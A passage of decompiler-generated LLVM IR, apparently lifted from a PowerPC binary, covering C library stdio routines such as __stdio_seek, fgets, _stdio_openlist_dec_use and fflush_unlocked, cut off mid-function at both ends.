  %v3_10014164 = inttoptr i32 %v2_10014164 to i32*
  store i32 %v1_10014160, i32* %v3_10014164, align 4
  %v0_10014168 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014168 = or i32 %v0_10014168, 16384
  store i32 %v1_10014168, i32* %r0.global-to-local, align 4
  %v1_1001416c = trunc i32 %v1_10014168 to i16
  %v2_1001416c = load i32, i32* @r31, align 4
  %v3_1001416c = inttoptr i32 %v2_1001416c to i16*
  store i16 %v1_1001416c, i16* %v3_1001416c, align 2
  br label %dec_label_pc_10014178

dec_label_pc_10014174:                            ; preds = %dec_label_pc_10014148
  %v2_10014174 = add i32 %v1_10014174, 12
  %v3_10014174 = inttoptr i32 %v2_10014174 to i32*
  store i32 0, i32* %v3_10014174, align 4
  br label %dec_label_pc_10014178

dec_label_pc_10014178:                            ; preds = %dec_label_pc_100140e4, %dec_label_pc_1001415c, %dec_label_pc_10014174
  %v0_10014178 = load i32, i32* @r31, align 4
  %v1_10014178 = inttoptr i32 %v0_10014178 to i16*
  %v2_10014178 = load i16, i16* %v1_10014178, align 2
  %v3_10014178 = zext i16 %v2_10014178 to i32
  store i32 %v3_10014178, i32* %r0.global-to-local, align 4
  %v1_1001417c = add i32 %v0_10014178, 8
  %v2_1001417c = inttoptr i32 %v1_1001417c to i32*
  %v3_1001417c = load i32, i32* %v2_1001417c, align 4
  store i32 %v3_1001417c, i32* %r9.global-to-local, align 4
  %v1_10014180 = and i32 %v3_10014178, 8192
  %v3_10014180 = icmp eq i32 %v1_10014180, 0
  store i1 %v3_10014180, i1* %cr0_eq.global-to-local, align 1
  %v3_10014188 = add i32 %v0_10014178, 2
  %v4_10014188 = inttoptr i32 %v3_10014188 to i8*
  store i8 0, i8* %v4_10014188, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014190 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014190 = load i32, i32* @r31, align 4
  %v2_10014190 = add i32 %v1_10014190, 20
  %v3_10014190 = inttoptr i32 %v2_10014190 to i32*
  store i32 %v0_10014190, i32* %v3_10014190, align 4
  %v0_10014194 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014194 = load i32, i32* @r31, align 4
  %v2_10014194 = add i32 %v1_10014194, 24
  %v3_10014194 = inttoptr i32 %v2_10014194 to i32*
  store i32 %v0_10014194, i32* %v3_10014194, align 4
  %v0_10014198 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014198 = load i32, i32* @r31, align 4
  %v2_10014198 = add i32 %v1_10014198, 28
  %v3_10014198 = inttoptr i32 %v2_10014198 to i32*
  store i32 %v0_10014198, i32* %v3_10014198, align 4
  %v0_1001419c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001419c = load i32, i32* @r31, align 4
  %v2_1001419c = add i32 %v1_1001419c, 16
  %v3_1001419c = inttoptr i32 %v2_1001419c to i32*
  store i32 %v0_1001419c, i32* %v3_1001419c, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v0_100141a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100141a4 = load i32, i32* @r31, align 4
  %v2_100141a4 = add i32 %v1_100141a4, 44
  %v3_100141a4 = inttoptr i32 %v2_100141a4 to i32*
  store i32 %v0_100141a4, i32* %v3_100141a4, align 4
  %v3_100141a8 = load i32, i32* @global_var_1002ab94.713, align 4
  store i32 %v3_100141a8, i32* %r0.global-to-local, align 4
  %v1_100141ac = load i32, i32* @r31, align 4
  %v2_100141ac = add i32 %v1_100141ac, 52
  %v3_100141ac = inttoptr i32 %v2_100141ac to i32*
  store i32 %v3_100141a8, i32* %v3_100141ac, align 4
  %v0_100141b0 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_100141b0, label %dec_label_pc_10014234, label %dec_label_pc_100141b4

dec_label_pc_100141b4:                            ; preds = %dec_label_pc_10014178
  store i32 ptrtoint ([3 x i8]* @global_var_10011770.591 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002a848.589 to i32), i32* %r29.global-to-local, align 4
  %v2_100141c4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100141c4, i32* @r26, align 4
  store i32 %v2_100141c4, i32* @r3, align 4
  %v0_100141d4 = call i32 @__pthread_return_void()
  %v2_100141e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100141e0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002a830.588 to i32), i32* @r29, align 4
  %v0_100141e8 = call i32 @__pthread_return_0()
  store i32 %v2_100141e0, i32* @r3, align 4
  %v0_100141f8 = call i32 @__pthread_return_void()
  %v0_10014200 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10014208 = load i32, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  store i32 %v3_10014208, i32* %r0.global-to-local, align 4
  store i32 %v2_100141e0, i32* @r3, align 4
  %v1_10014214 = load i32, i32* @r31, align 4
  %v2_10014214 = add i32 %v1_10014214, 32
  %v3_10014214 = inttoptr i32 %v2_10014214 to i32*
  store i32 %v3_10014208, i32* %v3_10014214, align 4
  %v0_10014218 = load i32, i32* @r31, align 4
  store i32 %v0_10014218, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  %v0_1001421c = call i32 @__pthread_return_void()
  store i32 %v2_100141c4, i32* @r3, align 4
  %v0_10014228 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10014234

dec_label_pc_10014230:                            ; preds = %dec_label_pc_10013fe4, %dec_label_pc_10013fd0, %dec_label_pc_10013ff0
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10014234

dec_label_pc_10014234:                            ; preds = %dec_label_pc_10014178, %dec_label_pc_10014030, %dec_label_pc_100141b4, %dec_label_pc_10014230
  store i32 %v0_10013f90, i32* %r0.global-to-local, align 4
  %v0_10014238 = load i32, i32* @r31, align 4
  ret i32 %v0_10014238

; uselistorder directives
  uselistorder i32 %v1_10014174, { 2, 0, 1 }
  uselistorder i32 %v0_100140e8, { 1, 0 }
  uselistorder i32 %v1_10014034, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10014020, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 4096, { 13, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 (i32)* @isatty, { 2, 0, 1 }
  uselistorder i32 21, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_open, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 9, 10, 11, 12, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder i32 56, { 3, 4, 6, 5, 0, 1, 2 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 22, { 2, 14, 3, 15, 11, 4, 12, 5, 6, 17, 7, 18, 8, 16, 9, 10, 0, 1, 13 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10014234, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10014230, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014178, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100140c4, { 1, 0 }
  uselistorder label %dec_label_pc_10014058, { 1, 0 }
  uselistorder label %dec_label_pc_10014028, { 1, 0 }
  uselistorder label %dec_label_pc_10014014, { 1, 0 }
  uselistorder label %dec_label_pc_10014000, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_1001424c = load i32, i32* @lr, align 4
  store i32 %v0_1001424c, i32* %r0.global-to-local, align 4
  %v0_10014258 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10014264 = add i32 %arg1, 4
  %v2_10014264 = inttoptr i32 %v1_10014264 to i32*
  %v3_10014264 = load i32, i32* %v2_10014264, align 4
  %v2_10014268 = load i32, i32* %arg2, align 4
  %v1_1001426c = add i32 %tmp, 4
  %v2_1001426c = inttoptr i32 %v1_1001426c to i32*
  %v3_1001426c = load i32, i32* %v2_1001426c, align 4
  store i32 268518004, i32* @lr, align 4
  %v4_10014270 = call i32 @__libc_lseek64(i32 %v3_10014264, i32 %v2_10014268, i32 %v3_1001426c, i32 %arg3)
  %v1_10014274 = icmp slt i32 %v4_10014270, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10014274, label %dec_label_pc_1001428c, label %dec_label_pc_10014280

dec_label_pc_10014280:                            ; preds = %entry
  %v1_10014280 = load i32, i32* @r31, align 4
  %v2_10014280 = inttoptr i32 %v1_10014280 to i32*
  store i32 %v4_10014270, i32* %v2_10014280, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014288 = load i32, i32* @r31, align 4
  %v2_10014288 = add i32 %v1_10014288, 4
  %v3_10014288 = inttoptr i32 %v2_10014288 to i32*
  store i32 %tmp, i32* %v3_10014288, align 4
  %v0_1001428c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001428c

dec_label_pc_1001428c:                            ; preds = %entry, %dec_label_pc_10014280
  %v0_1001428c = phi i32 [ %tmp, %entry ], [ %v0_1001428c.pre, %dec_label_pc_10014280 ]
  store i32 %v0_1001424c, i32* %r0.global-to-local, align 4
  store i32 %v0_10014258, i32* @r31, align 4
  ret i32 %v0_1001428c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_1001428c, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100142ac = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_100142ac, i32* %r28.global-to-local, align 4
  %v1_100142d0 = add i32 %arg3, 52
  %v2_100142d0 = inttoptr i32 %v1_100142d0 to i32*
  %v3_100142d0 = load i32, i32* %v2_100142d0, align 4
  %v2_100142d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100142d4, i32* @r3, align 4
  %v3_100142e0 = icmp eq i32 %v3_100142d0, 0
  store i1 %v3_100142e0, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100142e0, label %dec_label_pc_100142e8, label %dec_label_pc_100142f4

dec_label_pc_100142e8:                            ; preds = %entry
  %v0_100142e8 = call i32 @__pthread_return_void()
  %v0_100142f0 = call i32 @__pthread_return_0()
  %v0_100142f4.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100142f8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100142fc.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100142f4

dec_label_pc_100142f4:                            ; preds = %entry, %dec_label_pc_100142e8
  %v0_100142fc = phi i32 [ %v0_100142ac, %entry ], [ %v0_100142fc.pre, %dec_label_pc_100142e8 ]
  %v0_100142f8 = phi i32 [ %arg3, %entry ], [ %v0_100142f8.pre, %dec_label_pc_100142e8 ]
  %v0_100142f4 = phi i32 [ %arg2, %entry ], [ %v0_100142f4.pre, %dec_label_pc_100142e8 ]
  store i32 268518148, i32* @lr, align 4
  %v3_10014300 = inttoptr i32 %v0_100142fc to i8*
  %v4_10014300 = call i32 @__GI_fgets_unlocked(i8* %v3_10014300, i32 %v0_100142f4, i32 %v0_100142f8)
  store i32 %v4_10014300, i32* @r31, align 4
  store i32 %v2_100142d4, i32* @r3, align 4
  %v0_10014310 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10014310, label %dec_label_pc_10014314, label %dec_label_pc_10014318

dec_label_pc_10014314:                            ; preds = %dec_label_pc_100142f4
  %v0_10014314 = call i32 @__pthread_return_void()
  %v0_1001431c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014318

dec_label_pc_10014318:                            ; preds = %dec_label_pc_100142f4, %dec_label_pc_10014314
  %v0_1001431c = phi i32 [ %v4_10014300, %dec_label_pc_100142f4 ], [ %v0_1001431c.pre, %dec_label_pc_10014314 ]
  %v1_1001432c = call %1 @__asm_mtcrf(i32 8, i32 %v0_100142ac)
  %v9_1001432c = extractvalue %1 %v1_1001432c, 7
  store i4 %v9_1001432c, i4* @cr4, align 1
  ret i32 %v0_1001431c

; uselistorder directives
  uselistorder i32 %v0_100142ac, { 1, 0, 2 }
  uselistorder i32 52, { 1, 2, 3, 4, 5, 8, 6, 7, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014318, { 1, 0 }
  uselistorder label %dec_label_pc_100142f4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011770.591 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1002a848.589 to i32), i32* @r29, align 4
  %v2_1001435c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001435c, i32* @r3, align 4
  %v0_10014364 = call i32 @__pthread_return_void()
  %v0_1001436c = call i32 @__pthread_return_0()
  %v3_10014374 = load i32, i32* @global_var_1002abe0.708, align 4
  %v3_10014378 = icmp eq i32 %v3_10014374, 1
  br i1 %v3_10014378, label %dec_label_pc_10014380, label %dec_label_pc_10014428

dec_label_pc_10014380:                            ; preds = %entry
  %v3_10014384 = load i16*, i16** @global_var_1002abe4.709, align 4
  %v2_10014388 = icmp sgt i16* %v3_10014384, null
  br i1 %v2_10014388, label %dec_label_pc_10014390, label %dec_label_pc_10014428

dec_label_pc_10014390:                            ; preds = %dec_label_pc_10014380
  %v2_1001439c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001439c, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_100143a8 = call i32 @__pthread_return_void()
  %v0_100143b0 = call i32 @__pthread_return_0()
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_1001440810 = icmp eq i32 %storemerge7, 0
  %v0_1001440c11 = load i32, i32* @r30, align 4
  br i1 %v3_1001440810, label %dec_label_pc_10014414, label %dec_label_pc_100143c0

dec_label_pc_100143c0:                            ; preds = %dec_label_pc_10014390, %dec_label_pc_10014408.backedge
  %v0_1001440c16 = phi i32 [ %v0_1001440c, %dec_label_pc_10014408.backedge ], [ %v0_1001440c11, %dec_label_pc_10014390 ]
  %v3_1001440c17.in = phi i32 [ %v0_1001440c, %dec_label_pc_10014408.backedge ], [ %v0_1001440c11, %dec_label_pc_10014390 ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_10014408.backedge ], [ %storemerge7, %dec_label_pc_10014390 ]
  %v1_100143c0 = inttoptr i32 %storemerge15 to i16*
  %v2_100143c0 = load i16, i16* %v1_100143c0, align 2
  %v1_100143c4 = add i32 %storemerge15, 32
  %v2_100143c4 = inttoptr i32 %v1_100143c4 to i32*
  %v3_100143c4 = load i32, i32* %v2_100143c4, align 4
  store i32 %v3_100143c4, i32* @r31, align 4
  %v1_100143c8 = and i16 %v2_100143c0, -32720
  %v3_100143cc = icmp eq i16 %v1_100143c8, 48
  br i1 %v3_100143cc, label %dec_label_pc_100143dc, label %dec_label_pc_100143d4

dec_label_pc_100143d4:                            ; preds = %dec_label_pc_100143c0
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_10014408.backedge

dec_label_pc_100143dc:                            ; preds = %dec_label_pc_100143c0
  %v3_1001440c17 = icmp eq i32 %v3_1001440c17.in, 0
  br i1 %v3_1001440c17, label %dec_label_pc_100143e0, label %dec_label_pc_100143ec

dec_label_pc_100143e0:                            ; preds = %dec_label_pc_100143dc
  store i32 %v3_100143c4, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  br label %dec_label_pc_100143f0

dec_label_pc_100143ec:                            ; preds = %dec_label_pc_100143dc
  %v2_100143ec = add i32 %v0_1001440c16, 32
  %v3_100143ec = inttoptr i32 %v2_100143ec to i32*
  store i32 %v3_100143c4, i32* %v3_100143ec, align 4
  %v0_100143f0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100143f0

dec_label_pc_100143f0:                            ; preds = %dec_label_pc_100143e0, %dec_label_pc_100143ec
  %v0_100143f0 = phi i32 [ %storemerge15, %dec_label_pc_100143e0 ], [ %v0_100143f0.pre, %dec_label_pc_100143ec ]
  %v1_100143f0 = inttoptr i32 %v0_100143f0 to i16*
  %v2_100143f0 = load i16, i16* %v1_100143f0, align 2
  %v1_100143f8 = and i16 %v2_100143f0, 8192
  %v3_100143f8 = icmp eq i16 %v1_100143f8, 0
  br i1 %v3_100143f8, label %dec_label_pc_10014408.backedge, label %dec_label_pc_10014400

dec_label_pc_10014408.backedge:                   ; preds = %dec_label_pc_100143f0, %dec_label_pc_100143d4, %dec_label_pc_10014400
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10014408 = icmp eq i32 %storemerge, 0
  %v0_1001440c = load i32, i32* @r30, align 4
  br i1 %v3_10014408, label %dec_label_pc_10014414, label %dec_label_pc_100143c0

dec_label_pc_10014400:                            ; preds = %dec_label_pc_100143f0
  store i32 268518404, i32* @lr, align 4
  %v2_10014400 = call i32 @free(i32 %v0_100143f0)
  br label %dec_label_pc_10014408.backedge

dec_label_pc_10014414:                            ; preds = %dec_label_pc_10014408.backedge, %dec_label_pc_10014390
  store i32 %v2_1001439c, i32* @r3, align 4
  %v0_1001441c = call i32 @__pthread_return_void()
  %v0_10014424 = load i32, i32* @r29, align 4
  %v4_10014424 = inttoptr i32 %v0_10014424 to i16*
  store i16* %v4_10014424, i16** @global_var_1002abe4.709, align 4
  %v3_10014430.pre = load i32, i32* @global_var_1002abe0.708, align 4
  br label %dec_label_pc_10014428

dec_label_pc_10014428:                            ; preds = %dec_label_pc_10014380, %entry, %dec_label_pc_10014414
  %v3_10014430 = phi i32 [ 1, %dec_label_pc_10014380 ], [ %v3_10014374, %entry ], [ %v3_10014430.pre, %dec_label_pc_10014414 ]
  store i32 %v2_1001435c, i32* @r3, align 4
  %v1_10014438 = add i32 %v3_10014430, -1
  store i32 %v1_10014438, i32* @global_var_1002abe0.708, align 4
  %v0_10014440 = call i32 @__pthread_return_void()
  ret i32 %v0_10014440

; uselistorder directives
  uselistorder i32 %v0_1001440c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100143f0, { 1, 0 }
  uselistorder i32 %v3_100143c4, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 16, 15, 14, 13, 6, 5, 4, 3, 2, 1, 0, 12, 11, 10, 9, 8, 20, 19, 18, 17, 7 }
  uselistorder i16** @global_var_1002abe4.709, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10014428, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014408.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100143f0, { 1, 0 }
  uselistorder label %dec_label_pc_100143c0, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1002ab90.590 to i32), i32* %r9.global-to-local, align 4
  %v5_10014468 = icmp eq i16* %arg1, bitcast (i32** @global_var_1002ab90.590 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10014468, label %dec_label_pc_1001448c, label %dec_label_pc_10014480

dec_label_pc_10014480:                            ; preds = %entry
  %v4_10014480 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10014480, label %dec_label_pc_1001448c, label %dec_label_pc_100145b8

dec_label_pc_1001448c:                            ; preds = %dec_label_pc_10014480, %entry
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10011770.591 to i32), i32* @r30, align 4
  %v2_10014498 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10014498, i32* @r3, align 4
  %v0_100144ac = call i32 @__pthread_return_void()
  %v0_100144b4 = call i32 @__pthread_return_0()
  %v3_100144bc = load i32, i32* @global_var_1002abe0.708, align 4
  store i32 %v2_10014498, i32* @r3, align 4
  %v1_100144cc = add i32 %v3_100144bc, 1
  store i32 %v1_100144cc, i32* %r9.global-to-local, align 4
  store i32 %v1_100144cc, i32* @global_var_1002abe0.708, align 4
  %v0_100144d8 = call i32 @__pthread_return_void()
  store i32 %v2_10014498, i32* @r3, align 4
  %v0_100144e8 = call i32 @__pthread_return_void()
  %v0_100144f0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %v2_10014498, i32* @r3, align 4
  %v3_100144fc = load i32, i32* bitcast (i32** @global_var_1002ab90.590 to i32*), align 4
  store i32 %v3_100144fc, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10014508 = call i32 @__pthread_return_void()
  %v0_100145a8.pr = load i32, i32* @r31, align 4
  %v3_100145a83 = icmp eq i32 %v0_100145a8.pr, 0
  br i1 %v3_100145a83, label %dec_label_pc_100145b0, label %dec_label_pc_10014510

dec_label_pc_10014510:                            ; preds = %dec_label_pc_1001448c, %dec_label_pc_100145a4
  %v0_1001452c = phi i32 [ %v3_100145a4, %dec_label_pc_100145a4 ], [ %v0_100145a8.pr, %dec_label_pc_1001448c ]
  %v1_10014510 = inttoptr i32 %v0_1001452c to i16*
  %v2_10014510 = load i16, i16* %v1_10014510, align 2
  %v3_10014510 = zext i16 %v2_10014510 to i32
  %v1_10014514 = and i32 %v3_10014510, 64
  store i32 %v1_10014514, i32* %r9.global-to-local, align 4
  %v3_10014514 = icmp eq i32 %v1_10014514, 0
  br i1 %v3_10014514, label %dec_label_pc_100145a4, label %dec_label_pc_1001451c

dec_label_pc_1001451c:                            ; preds = %dec_label_pc_10014510
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10014520 = load i32, i32* @global_var_1002ab94.713, align 4
  %v3_10014524 = icmp eq i32 %v3_10014520, 2
  br i1 %v3_10014524, label %dec_label_pc_10014548, label %dec_label_pc_1001452c

dec_label_pc_1001452c:                            ; preds = %dec_label_pc_1001451c
  store i32 %v2_10014498, i32* @r3, align 4
  %v0_1001453c = call i32 @__pthread_return_void()
  %v0_10014544 = call i32 @__pthread_return_0()
  %v0_10014548.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014548

dec_label_pc_10014548:                            ; preds = %dec_label_pc_1001451c, %dec_label_pc_1001452c
  %v0_1001455c = phi i32 [ %v0_1001452c, %dec_label_pc_1001451c ], [ %v0_10014548.pre, %dec_label_pc_1001452c ]
  %v1_10014548 = inttoptr i32 %v0_1001455c to i16*
  %v2_10014548 = load i16, i16* %v1_10014548, align 2
  %v3_10014548 = zext i16 %v2_10014548 to i32
  %v0_1001454c = load i32, i32* @r27, align 4
  %v2_1001454c = or i32 %v0_1001454c, %v3_10014548
  %v1_10014550 = and i32 %v2_1001454c, 832
  %v1_10014554 = xor i32 %v1_10014550, 320
  store i32 %v1_10014554, i32* %r9.global-to-local, align 4
  %v3_10014554 = icmp eq i32 %v1_10014554, 0
  br i1 %v3_10014554, label %dec_label_pc_1001455c, label %dec_label_pc_10014588

dec_label_pc_1001455c:                            ; preds = %dec_label_pc_10014548
  store i32 %v0_1001455c, i32* @r3, align 4
  store i32 268518756, i32* @lr, align 4
  %v0_10014560 = call i32 @__stdio_wcommit()
  %v3_10014564 = icmp eq i32 %v0_10014560, 0
  br i1 %v3_10014564, label %dec_label_pc_10014574, label %dec_label_pc_1001456c

dec_label_pc_1001456c:                            ; preds = %dec_label_pc_1001455c
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10014588

dec_label_pc_10014574:                            ; preds = %dec_label_pc_1001455c
  %v0_10014574 = load i32, i32* @r31, align 4
  %v1_10014574 = inttoptr i32 %v0_10014574 to i16*
  %v2_10014574 = load i16, i16* %v1_10014574, align 2
  %v3_10014574 = zext i16 %v2_10014574 to i32
  %v1_10014578 = add i32 %v0_10014574, 8
  %v2_10014578 = inttoptr i32 %v1_10014578 to i32*
  %v3_10014578 = load i32, i32* %v2_10014578, align 4
  store i32 %v3_10014578, i32* %r9.global-to-local, align 4
  %v1_1001457c = call i32 @__asm_rlwinm(i32 %v3_10014574, i32 0, i32 26, i32 24)
  %v2_1001457c = trunc i32 %v1_1001457c to i16
  %v1_10014580 = load i32, i32* @r31, align 4
  %v2_10014580 = add i32 %v1_10014580, 28
  %v3_10014580 = inttoptr i32 %v2_10014580 to i32*
  store i32 %v3_10014578, i32* %v3_10014580, align 4
  %v3_10014584 = load i32, i32* @r31, align 4
  %v4_10014584 = inttoptr i32 %v3_10014584 to i16*
  store i16 %v2_1001457c, i16* %v4_10014584, align 2
  br label %dec_label_pc_10014588

dec_label_pc_10014588:                            ; preds = %dec_label_pc_10014548, %dec_label_pc_1001456c, %dec_label_pc_10014574
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_1001458c = load i32, i32* @global_var_1002ab94.713, align 4
  %v3_10014590 = icmp eq i32 %v3_1001458c, 2
  br i1 %v3_10014590, label %dec_label_pc_100145a4, label %dec_label_pc_10014598

dec_label_pc_10014598:                            ; preds = %dec_label_pc_10014588
  store i32 %v2_10014498, i32* @r3, align 4
  %v0_100145a0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100145a4

dec_label_pc_100145a4:                            ; preds = %dec_label_pc_10014588, %dec_label_pc_10014510, %dec_label_pc_10014598
  %v0_100145a4 = load i32, i32* @r31, align 4
  %v1_100145a4 = add i32 %v0_100145a4, 32
  %v2_100145a4 = inttoptr i32 %v1_100145a4 to i32*
  %v3_100145a4 = load i32, i32* %v2_100145a4, align 4
  store i32 %v3_100145a4, i32* @r31, align 4
  %v3_100145a8 = icmp eq i32 %v3_100145a4, 0
  br i1 %v3_100145a8, label %dec_label_pc_100145b0, label %dec_label_pc_10014510

dec_label_pc_100145b0:                            ; preds = %dec_label_pc_100145a4, %dec_label_pc_1001448c
  store i32 ptrtoint (i32* @global_var_100145b4.716 to i32), i32* @lr, align 4
  %v0_100145b0 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_100145f0

dec_label_pc_100145b8:                            ; preds = %dec_label_pc_10014480
  %v3_100145b8 = load i16, i16* %arg1, align 2
  %v4_100145b8 = zext i16 %v3_100145b8 to i32
  store i32 0, i32* @r28, align 4
  %v1_100145c0 = and i32 %v4_100145b8, 64
  store i32 %v1_100145c0, i32* %r9.global-to-local, align 4
  %v3_100145c0 = icmp eq i32 %v1_100145c0, 0
  br i1 %v3_100145c0, label %dec_label_pc_100145f0, label %dec_label_pc_100145c8

dec_label_pc_100145c8:                            ; preds = %dec_label_pc_100145b8
  store i32 268518860, i32* @lr, align 4
  %v0_100145c8 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_100145d0 = icmp eq i32 %v0_100145c8, 0
  br i1 %v3_100145d0, label %dec_label_pc_100145d8, label %dec_label_pc_100145f0

dec_label_pc_100145d8:                            ; preds = %dec_label_pc_100145c8
  %v0_100145d8 = load i32, i32* @r29, align 4
  %v1_100145d8 = inttoptr i32 %v0_100145d8 to i16*
  %v2_100145d8 = load i16, i16* %v1_100145d8, align 2
  %v3_100145d8 = zext i16 %v2_100145d8 to i32
  store i32 0, i32* @r28, align 4
  %v1_100145e0 = add i32 %v0_100145d8, 8
  %v2_100145e0 = inttoptr i32 %v1_100145e0 to i32*
  %v3_100145e0 = load i32, i32* %v2_100145e0, align 4
  store i32 %v3_100145e0, i32* %r9.global-to-local, align 4
  %v1_100145e4 = call i32 @__asm_rlwinm(i32 %v3_100145d8, i32 0, i32 26, i32 24)
  %v2_100145e4 = trunc i32 %v1_100145e4 to i16
  %v3_100145e8 = load i32, i32* @r29, align 4
  %v4_100145e8 = inttoptr i32 %v3_100145e8 to i16*
  store i16 %v2_100145e4, i16* %v4_100145e8, align 2
  %v0_100145ec = load i32, i32* %r9.global-to-local, align 4
  %v1_100145ec = load i32, i32* @r29, align 4
  %v2_100145ec = add i32 %v1_100145ec, 28
  %v3_100145ec = inttoptr i32 %v2_100145ec to i32*
  store i32 %v0_100145ec, i32* %v3_100145ec, align 4
  br label %dec_label_pc_100145f0

